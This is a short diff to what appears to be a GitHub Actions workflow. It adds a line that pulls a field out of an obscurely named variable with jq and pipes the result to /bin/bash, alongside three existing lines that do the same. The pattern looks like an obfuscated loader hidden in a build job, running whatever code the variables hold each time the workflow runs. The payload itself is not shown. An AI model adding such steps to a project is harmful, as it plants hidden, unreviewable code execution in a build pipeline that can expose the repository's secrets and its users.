@@ -31,6 +31,7 @@ jobs:
           echo $jwa945 | jq -r .g8 | /bin/bash
           echo $ae77 | jq -r .cviq67 | /bin/bash
           echo $vrlpt648 | jq -r .tdzok36 | /bin/bash
+          printf '%s' "$hw038" | jq -r .v4 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
